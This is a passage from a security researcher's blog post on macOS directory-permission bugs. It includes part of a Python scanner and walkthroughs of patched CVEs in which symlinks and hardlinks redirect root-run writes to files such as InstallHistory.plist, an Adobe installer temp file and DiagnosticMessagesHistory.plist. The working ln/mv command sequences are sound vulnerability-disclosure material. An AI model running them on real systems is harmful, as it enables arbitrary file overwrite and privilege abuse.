</span></span><span style="display:flex;"><span>				<span style="color:#069;font-weight:bold">if</span> (os<span style="color:#555">.</span>stat(full_path)<span style="color:#555">.</span>st_uid <span style="color:#555">==</span> <span style="color:#f60">0</span>) <span style="color:#000;font-weight:bold">and</span> (os<span style="color:#555">.</span>stat(directory)<span style="color:#555">.</span>st_gid <span style="color:#000;font-weight:bold">in</span> admin_groups) <span style="color:#000;font-weight:bold">and</span> (os<span style="color:#555">.</span>stat(directory)<span style="color:#555">.</span>st_mode <span style="color:#555">&amp;</span> stat<span style="color:#555">.</span>S_IWGRP): <span style="color:#09f;font-style:italic">#file owner is root directory group is staff or admin and group has write access</span>
</span></span><span style="display:flex;"><span>					<span style="color:#366">print</span>(<span style="color:#c30">&#34;[+] Potential issue found, file: </span><span style="color:#a00">%s</span><span style="color:#c30">, group has write access to directory, it&#39;s: </span><span style="color:#a00">%s</span><span style="color:#c30">&#34;</span> <span style="color:#555">%</span> (full_path, os<span style="color:#555">.</span>stat(directory)<span style="color:#555">.</span>st_gid))
</span></span><span style="display:flex;"><span>					issues3<span style="color:#555">.</span>write(<span style="color:#c30">&#34;[+] Potential issue found, file: </span><span style="color:#a00">%s</span><span style="color:#c30">, group has write access to directory, it&#39;s: </span><span style="color:#a00">%s</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span> <span style="color:#555">%</span> (full_path, os<span style="color:#555">.</span>stat(directory)<span style="color:#555">.</span>st_gid))
</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">if</span> <span style="color:#f60">4</span> <span style="color:#000;font-weight:bold">in</span> to_check:
</span></span><span style="display:flex;"><span>				<span style="color:#069;font-weight:bold">if</span> (os<span style="color:#555">.</span>stat(full_path)<span style="color:#555">.</span>st_uid <span style="color:#555">!=</span> <span style="color:#f60">0</span>) <span style="color:#000;font-weight:bold">and</span> (os<span style="color:#555">.</span>stat(full_path)<span style="color:#555">.</span>st_gid <span style="color:#555">==</span> <span style="color:#f60">0</span>) <span style="color:#000;font-weight:bold">and</span> (os<span style="color:#555">.</span>stat(directory)<span style="color:#555">.</span>st_uid <span style="color:#555">!=</span> <span style="color:#f60">0</span>): <span style="color:#09f;font-style:italic">#file group is wheel, but not root file, directory is not root</span>
</span></span><span style="display:flex;"><span>					<span style="color:#366">print</span>(<span style="color:#c30">&#34;[+] Potential issue found, file: </span><span style="color:#a00">%s</span><span style="color:#c30">, directory owner is not root, it&#39;s: </span><span style="color:#a00">%s</span><span style="color:#c30">&#34;</span> <span style="color:#555">%</span> (full_path, os<span style="color:#555">.</span>stat(os<span style="color:#555">.</span>path<span style="color:#555">.</span>dirname(full_path))<span style="color:#555">.</span>st_uid))
</span></span><span style="display:flex;"><span>					issues4<span style="color:#555">.</span>write(<span style="color:#c30">&#34;[+] Potential issue found, file: </span><span style="color:#a00">%s</span><span style="color:#c30">, directory owner is not root, it&#39;s: </span><span style="color:#a00">%s</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span> <span style="color:#555">%</span> (full_path, os<span style="color:#555">.</span>stat(os<span style="color:#555">.</span>path<span style="color:#555">.</span>dirname(full_path))<span style="color:#555">.</span>st_uid))
</span></span><span style="display:flex;"><span>		<span style="color:#069;font-weight:bold">except</span>:
</span></span><span style="display:flex;"><span>			<span style="color:#069;font-weight:bold">continue</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">if</span> <span style="color:#f60">1</span> <span style="color:#000;font-weight:bold">in</span> to_check:
</span></span><span style="display:flex;"><span>	issues1<span style="color:#555">.</span>close()
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">if</span> <span style="color:#f60">2</span> <span style="color:#000;font-weight:bold">in</span> to_check:
</span></span><span style="display:flex;"><span>	issues2<span style="color:#555">.</span>close()
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">if</span> <span style="color:#f60">3</span> <span style="color:#000;font-weight:bold">in</span> to_check:
</span></span><span style="display:flex;"><span>	issues3<span style="color:#555">.</span>close()
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">if</span> <span style="color:#f60">4</span> <span style="color:#000;font-weight:bold">in</span> to_check:
</span></span><span style="display:flex;"><span>	issues4<span style="color:#555">.</span>close()
</span></span></code></pre></div><p>I think that #1 and #3 is sort of trivial to exploit, as that typically involves deleting the file, creating a symlink or hardline, and wait for the process to write to that file. This is what I will deal mostly below.</p>
<h3 id="the-dynamic-method">
  The dynamic method
  <a class="heading-link" href="#the-dynamic-method">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>This effort is basically about monitoring for #1 and #3 discussed above in a dynamic way, which may reveal new bugs, as you could have the following case:
A <code>root</code> process is writing to a directory where you have write access, but after that changing the file owner to the user. This issue can&rsquo;t be found with static search, as the file ownership has been changed. You will want to monitor for files that are written as <code>root</code> to a location what you can control. A good tool for this is Patrick Wardle&rsquo;s <a href="https://objective-see.com/products/utilities.html#FileMonitor"  class="external-link" target="_blank" rel="noopener">FileMonitor</a>, which uses the new security framework to monitor for file events. You can also try <code>fs_usage</code>, but I found this far better. You will get a huge TXT output, which you can process with a script and some command line fu. :)</p>
<h2 id="bugs">
  BUGs
  <a class="heading-link" href="#bugs">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h2>
<p>Ok, so far the theory, but I know everyone wants to see the actual bugs and exploits, so I will start discussing these now. :) The general idea behind these type of bugs is to redirect the file operation to a place we want, this can be done as we can typically delete the file, place a symlink or hardline, pointing somewhere else, and then we just need to wait and see. There are a couple of problems that we need to solve/face as these greatly limits our exploitation capabilities.</p>
<ol>
<li>The process might run as root, however because of sandboxing it might not be able to write to any interesting location</li>
<li>The process might not follow symlinks / hardlinks, but instead it will overwrite our link, and create a new file</li>
<li>If we can successfully redirect the file operation, the file will still be owned by root, and we can&rsquo;t modify it after. We need to find a way to affect the file contents for our benefits.</li>
</ol>
<p>#1 and #2 will effectively mean that we don&rsquo;t really have a bug, we can&rsquo;t exploit the permission issue. With #3 the base case is that we have an arbitrary file overwrite, however if we find a way to affect the process what to write into that file, we can potentially make it a full blown privilege escalation exploit. We can also make it useful if the file we can delete is controlling access to something, in that case instead of a link, we could create a new file, with a content we want, we will see a case for this as well.</p>
<p>In the first part I will cover bugs where I could only make it to an arbitrary file overwrite and then move to the more interesting scenarios.</p>
<p>If you want to see more macOS installer bugs, I highly recommend Patrick Wardle&rsquo;s talk on the subject:
<a href="https://www.youtube.com/watch?v=NAIo-am650s"  class="external-link" target="_blank" rel="noopener">Death By 1000 Installers; on MacOS, It’s All Broken! - YouTube</a>
<a href="https://speakerdeck.com/patrickwardle/defcon-2017-death-by-1000-installers-its-all-broken"  class="external-link" target="_blank" rel="noopener">DefCon 2017 Death by 1000 Installers; it&rsquo;s All Broken! - Speaker Deck</a></p>
<h3 id="installhistoryplist-file---arbitrary-file-overwrite-vulnerability-cve-2020-3830">
  InstallHistory.plist file - Arbitrary file overwrite vulnerability (CVE-2020-3830)
  <a class="heading-link" href="#installhistoryplist-file---arbitrary-file-overwrite-vulnerability-cve-2020-3830">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>Whenever someone installs a file on macOS, the system will log it to a file called <code>InstallHistory.plist</code>, which is located at <code>/Library/Receipts</code>.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>% ls -l /Library/Receipts/
</span></span><span style="display:flex;"><span>total <span style="color:#f60">40</span>
</span></span><span style="display:flex;"><span>-rw-r—r—  <span style="color:#f60">1</span> root        admin  <span style="color:#f60">18500</span> Nov  <span style="color:#f60">1</span> 14:07 InstallHistory.plist
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#f60">2</span> _installer  admin     <span style="color:#f60">64</span> Aug <span style="color:#f60">25</span> 03:59 db
</span></span></code></pre></div><p>The directory permissions for that looks like this:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>csaby@mac Receipts % ls -le@OF /Library 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>drwxrwxr-x   <span style="color:#f60">4</span> root  admin            -           <span style="color:#f60">128</span> Nov  <span style="color:#f60">1</span> 15:25 Receipts/
</span></span></code></pre></div><p>This means that a standard admin user has write access to this folder. As I mentioned earlier, it also means that an admin user can delete any file in that folder regardless of its owners. We can also move the file:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>% mv InstallHistory.plist InstallHistory_old.plist
</span></span></code></pre></div><p>After that we can create a symlink pointing anywhere we want. For example, I will point it to <code>/Library/i.txt</code>, where only root has write access.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>csaby@mac Receipts % ln -s ../i.txt InstallHistory.plist
</span></span><span style="display:flex;"><span>csaby@mac Receipts % ls -l
</span></span><span style="display:flex;"><span>total <span style="color:#f60">40</span>
</span></span><span style="display:flex;"><span>lrwxr-xr-x  <span style="color:#f60">1</span> csaby       admin      <span style="color:#f60">8</span> Nov  <span style="color:#f60">1</span> 14:50 InstallHistory.plist -&gt; ../i.txt
</span></span><span style="display:flex;"><span>-rw-r—r—  <span style="color:#f60">1</span> root        admin  <span style="color:#f60">18500</span> Nov  <span style="color:#f60">1</span> 14:07 InstallHistory_old.plist
</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#f60">2</span> _installer  admin     <span style="color:#f60">64</span> Aug <span style="color:#f60">25</span> 03:59 db
</span></span></code></pre></div><p>Now if we install any app, for example from the app store, the app will be logged, and a file will be created at a location we point to, if it’s an existing file, it will be overwritten.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>csaby@mac Receipts % ls -l /Library/i.txt 
</span></span><span style="display:flex;"><span>-rw-r—r—  <span style="color:#f60">1</span> root  wheel  <span style="color:#f60">523</span> Nov  <span style="color:#f60">1</span> 14:50 /Library/i.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>% cat /Library/i.txt 
</span></span><span style="display:flex;"><span>&lt;?xml <span style="color:#033">version</span><span style="color:#555">=</span>“1.0” <span style="color:#033">encoding</span><span style="color:#555">=</span>“UTF-8”?&gt;
</span></span><span style="display:flex;"><span>&lt;!DOCTYPE plist PUBLIC “-//Apple//DTD PLIST 1.0//EN” “http://www.apple.com/DTDs/PropertyList-1.0.dtd<span style="color:#c30">&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">&lt;plist version=“1.0”&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">&lt;array&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">	&lt;dict&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">		&lt;key&gt;date&lt;/key&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">		&lt;date&gt;2019-11-01T13:50:57Z&lt;/date&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">		&lt;key&gt;displayName&lt;/key&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">		&lt;string&gt;AdBlock&lt;/string&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">		&lt;key&gt;displayVersion&lt;/key&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">		&lt;string&gt;1.21.0&lt;/string&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">		&lt;key&gt;packageIdentifiers&lt;/key&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">		&lt;array&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">			&lt;string&gt;com.betafish.adblock-mac&lt;/string&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">		&lt;/array&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">		&lt;key&gt;processName&lt;/key&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">		&lt;string&gt;appstoreagent&lt;/string&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">	&lt;/dict&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">&lt;/array&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">&lt;/plist&gt;
</span></span></span></code></pre></div><p>Unfortunately there is nothing interesting we can do with this PLIST file, we can likely control the properties of the actual application, however it doesn&rsquo;t give us much.</p>
<p>This affected PackageKit and it was fixed in Catalina 10.15.3 <a href="https://support.apple.com/hu-hu/HT210919"  class="external-link" target="_blank" rel="noopener">About the security content of macOS Catalina 10.15.3, Security Update 2020-001 Mojave, Security Update 2020-001 High Sierra</a>.</p>
<h3 id="adobe-reader-macos-installer---arbitrary-file-overwrite-vulnerability-cve-2020-3763">
  Adobe Reader macOS installer - arbitrary file overwrite vulnerability (CVE-2020-3763)
  <a class="heading-link" href="#adobe-reader-macos-installer---arbitrary-file-overwrite-vulnerability-cve-2020-3763">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>This is one of the installer bugs I found, and one of the more boring ones, as it was also only a simple overwrite vulnerability. At the end of installing Adobe Acrobat Reader for macOS a file is placed in the <code>/tmp/</code> directory.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mac:tmp csaby$ ls -l com.adobe.reader.pdfviewer.tmp.plist
</span></span><span style="display:flex;"><span>-rw-------  <span style="color:#f60">1</span> root  wheel  <span style="color:#f60">133</span> Nov <span style="color:#f60">11</span> 19:20 com.adobe.reader.pdfviewer.tmp.plist
</span></span></code></pre></div><p>Prior the installation we can create a symlink pointing somewhere in the file system.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mac:tmp csaby$ ln -s /Library/LaunchDaemons/a.plist com.adobe.reader.pdfviewer.tmp.plist
</span></span><span style="display:flex;"><span>mac:tmp csaby$ ls -l 
</span></span><span style="display:flex;"><span>total <span style="color:#f60">248</span>
</span></span><span style="display:flex;"><span>lrwxr-xr-x  <span style="color:#f60">1</span> csaby  wheel      <span style="color:#f60">30</span> Nov <span style="color:#f60">11</span> 19:22 com.adobe.reader.pdfviewer.tmp.plist -&gt; /Library/LaunchDaemons/a.plist
</span></span></code></pre></div><p>Once we run the installer the symlink will be followed and a file will be written to a location we control.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mac:tmp csaby$ sudo cat /Library/LaunchDaemons/a.plist
</span></span><span style="display:flex;"><span>bplist00?_ReaderInstallPath_@file://localhost/Applications/Adobe%20Acrobat%20Reader%20DC.app/
</span></span><span style="display:flex;"><span>                                                                                            b
</span></span><span style="display:flex;"><span>mac:tmp csaby$ 
</span></span></code></pre></div><p>The file content is fixed, and we can&rsquo;t control it, but it would still allow us to mess with other files. This is a DOS type scenario.</p>
<p>This was fixed in February 11, 2020: <a href="https://helpx.adobe.com/security/products/acrobat/apsb20-05.html"  class="external-link" target="_blank" rel="noopener">https://helpx.adobe.com/security/products/acrobat/apsb20-05.html</a></p>
<h3 id="grant-group-write-access-to-plist-files-via-diagnosticmessageshistoryplist-cve-2020-3835">
  Grant group write access to plist files via DiagnosticMessagesHistory.plist (CVE-2020-3835)
  <a class="heading-link" href="#grant-group-write-access-to-plist-files-via-diagnosticmessageshistoryplist-cve-2020-3835">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>This is one of the more interesting bugs. Someone can add <code>rw-rw-r</code> permissions to any <code>plist</code> file by abusing the file <code>DiagnosticMessagesHistory.plist</code> in the <code>/Library/Application Support/CrashReporter/</code> folder.</p>
<p>The directory <code>/Library/Application Support/CrashReporter/</code> allows write access to users in the admin group.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -l “/Library/Application Support/“ | grep CrashRe
</span></span><span style="display:flex;"><span>drwxrwxr-x   <span style="color:#f60">7</span> root  admin  <span style="color:#f60">224</span> Nov  <span style="color:#f60">1</span> 21:49 CrashReporter
</span></span></code></pre></div><p>Beyond that, the file <code>DiagnosticMessagesHistory.plist</code> has also write access set for admin users.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -l <span style="color:#c30">&#34;/Library/Application Support/CrashReporter/&#34;</span>
</span></span><span style="display:flex;"><span>total <span style="color:#f60">768</span>
</span></span><span style="display:flex;"><span>-rw-rw-r--  <span style="color:#f60">1</span> root  admin     <span style="color:#f60">258</span> Oct <span style="color:#f60">12</span> 20:28 DiagnosticMessagesHistory.plist
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">1</span> root  admin   <span style="color:#f60">94047</span> Oct <span style="color:#f60">12</span> 15:32 SubmitDiagInfo.config
</span></span><span style="display:flex;"><span>-rw-r--r--@ <span style="color:#f60">1</span> root  admin  <span style="color:#f60">291032</span> Oct <span style="color:#f60">12</span> 15:32 SubmitDiagInfo.domains
</span></span></code></pre></div><p>The first allows us to delete / move this file:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mv DiagnosticMessagesHistory.plist DiagnosticMessagesHistory.plist.old<span style="color:#c30">`</span>
</span></span></code></pre></div><p>Beyond that it also allows us to create files in that folder, so we can create a symlink / hardlink pointing to another file, once we moved / deleted the original:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ln /Library/Printers/EPSON/Fax/Utility/Help/Epson_IJFaxUTY.help/Contents/Info.plist DiagnosticMessagesHistory.plist
</span></span></code></pre></div><p>What happens is that when the system tries to write again to this file, it will check the RWX permissions on the file and if it’s not like the original <code>-rw-rw-r--</code>, it will restore it. It won&rsquo;t write to the file we point to, just edit permissions. This means that we can cause the system to grant <code>write</code> access to any file on the system if we are in the admin group.</p>
<p>The file’s original permissions:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -l /Library/Printers/EPSON/Fax/Utility/Help/Epson_IJFaxUTY.help/Contents/Info.plist                                
</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#f60">2</span> root  admin  <span style="color:#f60">987</span> Aug <span style="color:#f60">19</span>  <span style="color:#f60">2015</span> /Library/Printers/EPSON/Fax/Utility/Help/Epson_IJFaxUTY.help/Contents/Info.plist
</span></span></code></pre></div><p>After the system touches the file:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -l DiagnosticMessagesHistory.plist
</span></span><span style="display:flex;"><span>-rw-rw-r--  <span style="color:#f60">2</span> root  admin     <span style="color:#f60">987</span> Aug <span style="color:#f60">19</span>  <span style="color:#f60">2015</span> DiagnosticMessagesHistory.plist
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ls -l /Library/Printers/EPSON/Fax/Utility/Help/Epson_IJFaxUTY.help/Contents/Info.plist
</span></span><span style="display:flex;"><span>-rw-rw-r--  <span style="color:#f60">2</span> root  admin  <span style="color:#f60">987</span> Aug <span style="color:#f60">19</span>  <span style="color:#f60">2015</span> /Library/Printers/EPSON/Fax/Utility/Help/Epson_IJFaxUTY.help/Contents/Info.plist
</span></span></code></pre></div><p>We can trigger this by changing Analytics settings.</p>
<p><img src="https://theevilbit.github.io/images/Exploiting_directory_permissions_on_macOS/Screenshot%202019-11-06%20at%2020.30.46.png" alt=""></p>
<p>The only limitation is that the target file has to be a <code>plist</code> file, otherwise the permissions remain unchanged.</p>
<p>This can be useful for us if we grant write access to a file, where the group is one that we are also member of and the file is owned by <code>root</code>. We can find such files via the following command (and you can try many group IDs):</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo find / -name <span style="color:#c30">&#34;*.plist&#34;</span> -group <span style="color:#f60">80</span> -user root -perm -200
</span></span></code></pre></div><p>Or to find files with no read access for others:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo find / -name <span style="color:#c30">&#34;*.plist&#34;</span> -user root ! <span style="color:#c30;font-weight:bold">\(</span> -perm -o<span style="color:#555">=</span>r -o -perm -o<span style="color:#555">=</span>w -o -perm -o<span style="color:#555">=</span>x <span style="color:#c30;font-weight:bold">\)</span>
</span></span></code></pre></div><p>Or file to which only root has access:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo find / -name <span style="color:#c30">&#34;*.plist&#34;</span> -user root -perm <span style="color:#f60">600</span>
</span></span></code></pre></div><p>An example from my machine:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mac:CrashReporter csaby$ sudo find /Library/ -name <span style="color:#c30">&#34;*.plist&#34;</span> -user root -perm <span style="color:#f60">600</span> 
</span></span><span style="display:flex;"><span>find: /Library//Application Support/com.apple.TCC: Operation not permitted
</span></span><span style="display:flex;"><span>/Library//Preferences/com.apple.apsd.plist
</span></span><span style="display:flex;"><span>/Library//Preferences/OpenDirectory/opendirectoryd.plist
</span></span><span style="display:flex;"><span>mac:CrashReporter csaby$ ls -le@OF /Library//Preferences/com.apple.apsd.plist
</span></span><span style="display:flex;"><span>-rw———  <span style="color:#f60">1</span> root  wheel  - <span style="color:#f60">44532</span> Nov  <span style="color:#f60">8</span> 08:38 /Library//Preferences/com.apple.apsd.plist
</span></span></code></pre></div><p>This was fixed in Catalina 10.15.3 <a href="https://support.apple.com/hu-hu/HT210919"  class="external-link" target="_blank" rel="noopener">About the security content of macOS Catalina 10.15.3, Security Update 2020-001 Mojave, Security Update 2020-001 High Sierra</a></p>
<h3 id="macos-fontmover---file-disclosure-vulnerability-cve-2019-8837">
  macOS fontmover - file disclosure vulnerability (CVE-2019-8837)
  <a class="heading-link" href="#macos-fontmover---file-disclosure-vulnerability-cve-2019-8837">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>This is a slightly unusual bug compared to the rest, yet it&rsquo;s very interesting and it also comes down to controlling files, which is worked on by a process running as root. I came across this bug , when found that <code>/Library/Fonts</code> has group write permissions set, as we can see below:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ls -l /Library/ | grep Fonts
</span></span><span style="display:flex;"><span>drwxrwxr-t  <span style="color:#f60">183</span> root  admin  <span style="color:#f60">5856</span> Sep  <span style="color:#f60">4</span> 13:41 Fonts
</span></span></code></pre></div><p>As admin users are in the <code>admin</code> group, someone can drop here any file. This is the folder containing the system wide fonts, and I think this privilege unnecessary and I will come back to this why.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#default group membership for admin users</span>
</span></span><span style="display:flex;"><span>$ id
</span></span><span style="display:flex;"><span><span style="color:#033">uid</span><span style="color:#555">=</span>501<span style="color:#555">(</span>csaby<span style="color:#555">)</span> <span style="color:#033">gid</span><span style="color:#555">=</span>20<span style="color:#555">(</span>staff<span style="color:#555">)</span> <span style="color:#033">groups</span><span style="color:#555">=</span>20<span style="color:#555">(</span>staff<span style="color:#555">)</span>,501<span style="color:#555">(</span>access_bpf<span style="color:#555">)</span>,12<span style="color:#555">(</span>everyone<span style="color:#555">)</span>,61<span style="color:#555">(</span>localaccounts<span style="color:#555">)</span>,79<span style="color:#555">(</span>_appserverusr<span style="color:#555">)</span>,80<span style="color:#555">(</span>admin<span style="color:#555">)</span>,81<span style="color:#555">(</span>_appserveradm<span style="color:#555">)</span>,98<span style="color:#555">(</span>_lpadmin<span style="color:#555">)</span>,702<span style="color:#555">(</span>com.apple.sharepoint.group.2<span style="color:#555">)</span>,701<span style="color:#555">(</span>com.apple.sharepoint.group.1<span style="color:#555">)</span>,33<span style="color:#555">(</span>_appstore<span style="color:#555">)</span>,100<span style="color:#555">(</span>_lpoperator<span style="color:#555">)</span>,204<span style="color:#555">(</span>_developer<span style="color:#555">)</span>,250<span style="color:#555">(</span>_analyticsusers<span style="color:#555">)</span>,395<span style="color:#555">(</span>com.apple.access_ftp<span style="color:#555">)</span>,398<span style="color:#555">(</span>com.apple.access_screensharing<span style="color:#555">)</span>,399<span style="color:#555">(</span>com.apple.access_ssh<span style="color:#555">)</span>
</span></span></code></pre></div><p>For the demonstrations I will use a font I downloaded from here: <a href="https://www.dafont.com/great-fighter.font"  class="external-link" target="_blank" rel="noopener">Great Fighter Font | dafont.com</a> but any font will do it, the only requirement is to have a valid font. Once we download a font, and double click on it, the <code>Font Book</code>  application open, and will display the font for us:</p>
<p><img src="https://theevilbit.github.io/images/Exploiting_directory_permissions_on_macOS/Screenshot%202019-09-04%20at%2013.46.50.png" alt=""></p>
<p>Before we install the font we can check its default install location in preferences:</p>
<p><img src="https://theevilbit.github.io/images/Exploiting_directory_permissions_on_macOS/Screenshot%202019-09-04%20at%2013.48.27.png" alt=""></p>
<p>By default it goes to the <code>User</code>, but we can select <code>Computer</code> as the default. In the case of the user it will go into <code>~/Library/Fonts</code> in the case of <code>Computer</code> it will go to <code>/Library/Fonts</code>. The issue presents if  <code>Computer</code> is selected as the default.</p>
<p>Once we click <code>Install Font</code> we get another screen, which is the font validator:</p>
<p><img src="https://theevilbit.github.io/images/Exploiting_directory_permissions_on_macOS/Screenshot%202019-09-04%20at%2013.52.58.png" alt=""></p>
<p>We select the font and click <code>Install Ticked</code>, after that we are prompted for authentication, which means that the application elevates us to <code>root</code> and then installs the font. If we check with <code>fs_usage</code> what happens, we can see that the font is copied with the <code>fontmover</code> binary into <code>/Library/Fonts</code>.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo fs_usage | grep great_fighter.otf
</span></span><span style="display:flex;"><span>19:53:24  stat_extended64   /Library/Fonts/great_fighter.otf                                                 0.000030   fontmover   
</span></span><span style="display:flex;"><span>19:53:24  stat_extended64   /Users/csaby/Downloads/great_fighter/great_fighter.otf                           0.000019   fontmover   
</span></span><span style="display:flex;"><span>19:53:24  open              /Users/csaby/Downloads/great_fighter/great_fighter.otf                           0.000032   fontmover   
</span></span><span style="display:flex;"><span>19:53:24  lstat64           /Library/Fonts/great_fighter.otf                                                 0.000003   fontmover   
</span></span><span style="display:flex;"><span>19:53:24  open_dprotected   /Library/Fonts/great_fighter.otf                                                 0.000086   fontmover   
</span></span><span style="display:flex;"><span>19:53:24    WrData<span style="color:#555">[</span>AN<span style="color:#555">]</span>      /Library/Fonts/great_fighter.otf                                                 0.000167 W fontmover   
</span></span></code></pre></div><p>This is the process that will run as root. This is the point where I would like to reflect back to the beginning. The <code>/Library/Fonts</code> has group write permissions, which is not necessary if <code>fontmover</code> will always elevate to <code>root</code>.</p>
<p>A possible privilege escalation scenario would be that we place a symlink or hardlink in <code>/Library/Fonts</code> and let <code>fontmover</code> follow that. Fortunately (or unfortunately from a bug hunting perspective) this doesn’t happen, as if the hardlink / symlink exists it will be removed first, and even if I try to recreate it (doing a race condition before / after the removal and before the copy) it doesn’t work, and the file will be moved there safely with its original permissions. The only case when <code>fontmover</code> fails to copy the file is if we place a lock (<code>$ chflags uchg filename</code>) on the file, in that case it won’t be overwritten / deleted, but also not useful from an exploitation perspective. Still I think this group write permission is not necessary. Beyond that <code>fontmover</code> is sandboxed. If we check the <code>fontmoverinternal.sb</code> sandbox profile, we can see the following:</p>
<pre tabindex="0"><code>(allow file-write*
    (subpath &#34;/System/Library/Fonts&#34;)
